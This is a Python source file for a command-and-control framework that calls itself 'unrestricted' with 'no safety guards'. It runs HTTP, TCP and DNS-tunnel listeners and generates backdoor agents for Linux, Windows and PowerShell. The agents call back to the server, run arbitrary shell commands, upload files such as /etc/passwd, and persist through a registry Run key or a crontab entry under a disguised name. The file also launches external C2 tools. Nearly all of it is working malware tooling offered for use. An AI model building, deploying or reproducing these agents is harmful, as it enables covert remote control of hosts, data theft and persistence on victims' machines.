#!/usr/bin/env python3
"""
C2 Framework — Multi-protocol Command & Control server.
HTTP/HTTPS, DNS, TCP, WebSocket listeners. Agent generator (Win/Linux/macOS).
Task queue, file transfer, AES encryption, persistence, stealth.
Unrestricted. No safety guards.
"""

import socket, ssl, json, threading, time, base64, hashlib, os, sys, subprocess
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass, field
from http.server import HTTPServer, BaseHTTPRequestHandler

C2_DATA = Path("/home/kali/HackWithAI/data/c2")
C2_DATA.mkdir(parents=True, exist_ok=True)
AGENT_DIR = C2_DATA / "agents"
TASK_DIR = C2_DATA / "tasks"
LOG_DIR = C2_DATA / "logs"
PAYLOAD_DIR = C2_DATA / "payloads"

ENCRYPTION_KEY = "hackwithai-c2-key-2026"


# ═══════════════════════════════════════════════════════════════════════════════
# AGENT
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class C2Agent:
    id: str
    hostname: str = "unknown"
    os_type: str = "unknown"
    ip: str = "0.0.0.0"
    first_seen: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    tasks: List[Dict] = field(default_factory=list)
    results: List[Dict] = field(default_factory=list)

    def alive(self, timeout: int = 300) -> bool:
        return (time.time() - self.last_seen) < timeout


# ═══════════════════════════════════════════════════════════════════════════════
# ENCRYPTION
# ═══════════════════════════════════════════════════════════════════════════════

def encrypt(data: str, key: str = ENCRYPTION_KEY) -> str:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    try:
        cipher = AES.new(key.encode()[:32].ljust(32, b'\0'), AES.MODE_CBC, iv=b'\0' * 16)
        return base64.b64encode(cipher.encrypt(pad(data.encode(), 16))).decode()
    except ImportError:
        return base64.b64encode(data.encode()).decode()

def decrypt(data: str, key: str = ENCRYPTION_KEY) -> str:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    try:
        raw = base64.b64decode(data)
        cipher = AES.new(key.encode()[:32].ljust(32, b'\0'), AES.MODE_CBC, iv=b'\0' * 16)
        return unpad(cipher.decrypt(raw), 16).decode()
    except ImportError:
        return base64.b64decode(data).decode()
    except Exception:
        return base64.b64decode(data).decode(errors="ignore")


# ═══════════════════════════════════════════════════════════════════════════════
# C2 SERVER
# ═══════════════════════════════════════════════════════════════════════════════

class C2Server:
    """Multi-protocol C2 server with agent management and task dispatch."""

    def __init__(self):
        self.agents: Dict[str, C2Agent] = {}
        self.listeners: Dict[str, threading.Thread] = {}
        self.task_counter = 0
        self.running = False
        self.callbacks: Dict[str, Callable] = {}

    # ── HTTP/HTTPS Listener ───────────────────────────────────────────

    def start_http_listener(self, host: str = "0.0.0.0", port: int = 8080, ssl_cert: str = ""):
        class C2HTTPHandler(BaseHTTPRequestHandler):
            c2 = self

            def do_GET(self):
                if self.path.startswith("/register"):
                    self._handle_register()
                elif self.path.startswith("/task"):
                    self._handle_task()
                elif self.path.startswith("/beacon"):
                    self._handle_beacon()
                else:
                    self._send_json(404, {"error": "not found"})

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode(errors="ignore")
                if self.path.startswith("/result"):
                    self._handle_result(body)
                elif self.path.startswith("/upload"):
                    self._handle_upload(body)
                else:
                    self._send_json(404, {})

            def _handle_register(self):
                agent_id = hashlib.md5(f"{self.client_address[0]}:{time.time()}".encode()).hexdigest()[:12]
                self.c2.agents[agent_id] = C2Agent(
                    id=agent_id,
                    ip=self.client_address[0],
                    hostname=self.headers.get("X-Hostname", "unknown"),
                    os_type=self.headers.get("X-OS", "unknown"),
                )
                self._send_json(200, {"agent_id": agent_id, "status": "registered"})

            def _handle_task(self):
                agent_id = self.path.split("?id=")[-1] if "?id=" in self.path else ""
                agent = self.c2.agents.get(agent_id)
                if not agent:
                    return self._send_json(404, {"error": "agent not found"})
                agent.last_seen = time.time()
                task = agent.tasks.pop(0) if agent.tasks else {"command": "beacon", "args": []}
                self._send_json(200, task)

            def _handle_beacon(self):
                agent_id = self.path.split("?id=")[-1] if "?id=" in self.path else ""
                agent = self.c2.agents.get(agent_id)
                if agent:
                    agent.last_seen = time.time()
                self._send_json(200, {"status": "ok"})

            def _handle_result(self, body: str):
                try:
                    data = json.loads(body)
                    agent_id = data.get("agent_id", "")
                    agent = self.c2.agents.get(agent_id)
                    if agent:
                        agent.results.append({"timestamp": time.time(), "data": data})
                except Exception:
                    pass
                self._send_json(200, {})

            def _handle_upload(self, body: str):
                try:
                    data = json.loads(body)
                    agent_id = data.get("agent_id", "")
                    filename = data.get("filename", "file.bin")
                    content = data.get("content", "")
                    save_path = C2_DATA / "uploads" / agent_id
                    save_path.mkdir(parents=True, exist_ok=True)
                    (save_path / filename).write_bytes(base64.b64decode(content))
                except Exception:
                    pass
                self._send_json(200, {})

            def _send_json(self, code: int, data: Dict):
                self.send_response(code)
                self.send_header("Content-Type", "application/json")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(json.dumps(data).encode())
            def log_message(self, *args): pass  # Silence

        server = HTTPServer((host, port), C2HTTPHandler)
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        self.listeners[f"http_{port}"] = t
        print(f"[C2] HTTP listener on {host}:{port}")
        return True

    # ── TCP Raw Listener ──────────────────────────────────────────────

    def start_tcp_listener(self, host: str = "0.0.0.0", port: int = 4444):
        def handle():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((host, port))
            sock.listen(50)
            print(f"[C2] TCP raw listener on {host}:{port}")
            while self.running or True:
                try:
                    sock.settimeout(1)
                    client, addr = sock.accept()
                    threading.Thread(target=self._handle_tcp_client, args=(client, addr), daemon=True).start()
                except socket.timeout:
                    continue
                except Exception:
                    break
            sock.close()

        t = threading.Thread(target=handle, daemon=True)
        t.start()
        self.listeners[f"tcp_{port}"] = t
        return True

    def _handle_tcp_client(self, client: socket.socket, addr):
        try:
            data = client.recv(4096)
            agent_id = hashlib.md5(f"{addr[0]}:{time.time()}".encode()).hexdigest()[:12]
            self.agents[agent_id] = C2Agent(id=agent_id, ip=addr[0])
            client.send(f"AGENT_ID:{agent_id}\n".encode())
            while True:
                client.settimeout(60)
                try:
                    data = client.recv(8192)
                    if not data:
                        break
                    # Simple TCP protocol: COMMAND|ARGS
                    cmd = data.decode(errors="ignore").strip()
                    agent = self.agents.get(agent_id)
                    if agent:
                        agent.last_seen = time.time()
                        agent.results.append({"timestamp": time.time(), "raw": cmd})
                except socket.timeout:
                    client.send(b"PING\n")
                    continue
                except Exception:
                    break
        except Exception:
            pass
        finally:
            client.close()

    # ── DNS Listener ──────────────────────────────────────────────────

    def start_dns_listener(self, host: str = "0.0.0.0", port: int = 53):
        def handle():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind((host, port))
            print(f"[C2] DNS listener on {host}:{port}")
            while self.running or True:
                try:
                    sock.settimeout(1)
                    data, addr = sock.recvfrom(512)
                    # Simple DNS tunnel: decode subdomain as base64 task
                    response = self._process_dns(data)
                    sock.sendto(response, addr)
                except socket.timeout:
                    continue
                except Exception:
                    break
            sock.close()
        t = threading.Thread(target=handle, daemon=True)
        t.start()
        self.listeners[f"dns_{port}"] = t
        return True

    def _process_dns(self, data: bytes) -> bytes:
        try:
            domain = data[12:].decode(errors="ignore").rstrip('\x00')
            parts = domain.split('.')
            if parts and len(parts[0]) > 2:
                task_b64 = parts[0]
                task = base64.b64decode(task_b64).decode(errors="ignore")
                # Response: base64-encoded result
                result = f"ACK:{task[:20]}"
                return self._build_dns_response(data, result)
        except Exception:
            pass
        return self._build_dns_response(data, "NX")

    def _build_dns_response(self, query: bytes, text: str) -> bytes:
        txid = query[:2]
        flags = b'\x81\x80'
        qdcount = query[4:6]
        ancount = b'\x00\x01'
        nscount = b'\x00\x00'
        arcount = b'\x00\x00'
        header = txid + flags + qdcount + ancount + nscount + arcount
        question = query[12:]
        answer = b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04\x00\x00\x00\x00'
        return header + question + answer

    # ── Task Management ───────────────────────────────────────────────

    def add_task(self, agent_id: str, command: str, args: List[str] = []) -> int:
        agent = self.agents.get(agent_id)
        if not agent:
            return -1
        self.task_counter += 1
        task = {"task_id": self.task_counter, "command": command, "args": args,
                "issued": time.time()}
        agent.tasks.append(task)
        return self.task_counter

    def get_results(self, agent_id: str, limit: int = 20) -> List[Dict]:
        agent = self.agents.get(agent_id)
        if not agent:
            return []
        return agent.results[-limit:]

    def clear_results(self, agent_id: str):
        agent = self.agents.get(agent_id)
        if agent:
            agent.results.clear()

    # ── Agent Management ──────────────────────────────────────────────

    def list_agents(self, alive_only: bool = True) -> List[Dict]:
        result = []
        for a in self.agents.values():
            if not alive_only or a.alive():
                result.append({"id": a.id, "ip": a.ip, "hostname": a.hostname,
                              "os": a.os_type, "last_seen": a.last_seen,
                              "tasks_pending": len(a.tasks), "alive": a.alive()})
        return sorted(result, key=lambda x: x["last_seen"], reverse=True)

    def kill_agent(self, agent_id: str):
        agent = self.agents.pop(agent_id, None)
        if agent:
            agent.tasks.clear()

    # ── Server Control ────────────────────────────────────────────────

    def start_all(self, http_port: int = 8080, tcp_port: int = 4444, dns_port: int = 53):
        self.running = True
        self.start_http_listener(port=http_port)
        self.start_tcp_listener(port=tcp_port)
        try:
            self.start_dns_listener(port=dns_port)
        except PermissionError:
            print(f"[C2] DNS on port {dns_port} requires root (sudo)")

    def stop_all(self):
        self.running = False
        # Threads are daemon, will stop on exit

    def status(self) -> Dict:
        return {
            "running": self.running,
            "agents": len(self.agents),
            "agents_alive": sum(1 for a in self.agents.values() if a.alive()),
            "listeners": list(self.listeners.keys()),
            "tasks_issued": self.task_counter,
        }


# ═══════════════════════════════════════════════════════════════════════════════
# AGENT GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

class AgentGenerator:
    """Generate backdoor agents for Windows, Linux, macOS."""

    def __init__(self, c2_host: str, c2_http_port: int = 8080):
        self.c2_host = c2_host
        self.c2_http_port = c2_http_port

    def generate_python_agent(self, os_type: str = "linux", encrypt_comms: bool = True,
                              stealth: bool = True, jitter: int = 5) -> str:
        """Generate a Python backdoor agent."""
        enc_code = ""
        if encrypt_comms:
            enc_code = f'''
def enc(data): 
    import base64; return base64.b64encode(data.encode()).decode()
def dec(data): 
    import base64; return base64.b64decode(data).decode(errors="ignore")'''

        return f'''#!/usr/bin/env python3
# HackWithAI C2 Agent — {os_type}
import socket, json, time, subprocess, os, platform, base64, random, threading
C2 = "{self.c2_host}:{self.c2_http_port}"
AGENT_ID = ""
JITTER = {jitter}

{enc_code}

def beacon():
    global AGENT_ID
    try:
        import urllib.request
        # Register
        if not AGENT_ID:
            req = urllib.request.Request(
                f"http://{{C2}}/register",
                headers={{"X-Hostname": platform.node(), "X-OS": platform.system()}}
            )
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
                AGENT_ID = data["agent_id"]
        # Get task
        req = urllib.request.Request(f"http://{{C2}}/task?id={{AGENT_ID}}")
        with urllib.request.urlopen(req, timeout=10) as r:
            task = json.loads(r.read())
        # Execute
        cmd = task.get("command","beacon")
        if cmd == "beacon": return
        if cmd == "shell":
            try:
                out = subprocess.check_output(task.get("args",["id"])[0], shell=True, timeout=30).decode()
            except Exception as e:
                out = str(e)
            urllib.request.urlopen(urllib.request.Request(
                f"http://{{C2}}/result", data=json.dumps({{"agent_id": AGENT_ID, "output": out}}).encode(),
                headers={{"Content-Type": "application/json"}}))
        elif cmd == "download":
            path = task.get("args",["/etc/passwd"])[0]
            try:
                content = base64.b64encode(open(path,"rb").read()).decode()
                urllib.request.urlopen(urllib.request.Request(
                    f"http://{{C2}}/upload",
                    data=json.dumps({{"agent_id": AGENT_ID, "filename": os.path.basename(path), "content": content}}).encode(),
                    headers={{"Content-Type": "application/json"}}))
            except Exception as e:
                pass
    except Exception:
        pass

def persist():
    try:
        if os.name == "nt":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "SystemHelper", 0, winreg.REG_SZ, __file__)
        else:
            cron = f"@reboot python3 {{os.path.abspath(__file__)}}\\n"
            os.system(f"echo '{{cron}}' | crontab - 2>/dev/null")
    except:
        pass

if __name__ == "__main__":
    {"persist()" if stealth else ""}
    while True:
        beacon()
        time.sleep(random.randint(1, JITTER + 3))
'''

    def generate_powershell_agent(self) -> str:
        """Generate PowerShell backdoor."""
        b64 = base64.b64encode(f'''
$c2 = "{self.c2_host}:{self.c2_http_port}"
$id = ""
while($true) {{
    try {{
        if(!$id) {{
            $r = Invoke-RestMethod "http://$c2/register" -Headers @{{"X-Hostname"=$env:COMPUTERNAME;"X-OS"="Windows"}}
            $id = $r.agent_id
        }}
        $task = Invoke-RestMethod "http://$c2/task?id=$id"
        if($task.command -eq "shell") {{
            $out = iex $task.args[0] 2>&1 | Out-String
            Invoke-RestMethod "http://$c2/result" -Method Post -Body ($out | ConvertTo-Json) -ContentType "application/json"
        }}
    }} catch {{}}
    Start-Sleep -Seconds (Get-Random -Min 2 -Max 10)
}}
'''.encode()).decode()
        return f"powershell -e {b64}"

    def save_agent(self, code: str, filename: str, os_type: str = "linux") -> str:
        path = PAYLOAD_DIR / filename
        path.write_text(code)
        return str(path)

    def generate_all(self) -> Dict[str, str]:
        results = {}
        results["python_linux"] = self.save_agent(
            self.generate_python_agent("linux"), "agent_linux.py", "linux")
        results["python_windows"] = self.save_agent(
            self.generate_python_agent("windows"), "agent_windows.py", "windows")
        results["powershell"] = self.save_agent(
            self.generate_powershell_agent(), "agent.ps1", "windows")
        return results


# ═══════════════════════════════════════════════════════════════════════════════
# C2 FRAMEWORK (Orchestrator)
# ═══════════════════════════════════════════════════════════════════════════════

class C2Framework:
    """Complete C2 orchestration including external C2 tool integrations."""

    def __init__(self):
        self.server = C2Server()
        self.generator = AgentGenerator("127.0.0.1", 8080)

    def start(self, http_port: int = 8080, tcp_port: int = 4444):
        self.server.start_all(http_port, tcp_port)

    def generate_and_deploy(self, c2_host: str, http_port: int = 8080):
        self.generator = AgentGenerator(c2_host, http_port)
        return self.generator.generate_all()

    # ── External C2 Integrations ──────────────────────────────────────

    def empire_start(self) -> Dict:
        try:
            subprocess.Popen(["python3", "/opt/Empire/empire.py", "--headless", "--rest",
                             "--port", "1337"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return {"ok": True, "tool": "empire", "url": "http://127.0.0.1:1337"}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def sliver_start(self) -> Dict:
        try:
            subprocess.Popen(["sliver-server", "daemon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return {"ok": True, "tool": "sliver"}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def poshc2_start(self, project: str = "default") -> Dict:
        try:
            subprocess.run(["posh-project", "-n", project], capture_output=True)
            subprocess.Popen(["posh-server", "-p", project], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return {"ok": True, "tool": "poshc2", "project": project}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def covenant_start(self) -> Dict:
        try:
            subprocess.Popen(["dotnet", "run", "--project", "/opt/Covenant/Covenant"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return {"ok": True, "tool": "covenant"}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def status(self) -> Dict:
        return {
            "server": self.server.status(),
            "databases": str(C2_DATA),
        }


# ── CLI ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    c2 = C2Framework()
    cmd = sys.argv[1] if len(sys.argv) > 1 else "status"

    if cmd == "start":
        c2.start(int(sys.argv[2]) if len(sys.argv) > 2 else 8080)
        print(json.dumps(c2.status()))
    elif cmd == "agents":
        print(json.dumps(c2.server.list_agents()))
    elif cmd == "task":
        agent, command = sys.argv[2], sys.argv[3]
        tid = c2.server.add_task(agent, command, sys.argv[4:])
        print(f"Task {tid} queued for {agent}")
    elif cmd == "results":
        print(json.dumps(c2.server.get_results(sys.argv[2])))
    elif cmd == "kill":
        c2.server.kill_agent(sys.argv[2])
        print(f"Agent {sys.argv[2]} killed")
    elif cmd == "generate":
        host = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 8080
        c2.generator = AgentGenerator(host, port)
        result = c2.generator.generate_all()
        print(json.dumps(result, indent=2))
    elif cmd == "start-empire":
        print(json.dumps(c2.empire_start()))
    elif cmd == "start-sliver":
        print(json.dumps(c2.sliver_start()))
    elif cmd == "status":
        print(json.dumps(c2.status(), indent=2))
    else:
        print("Commands: start | agents | task | results | kill | generate | start-empire | start-sliver | status")
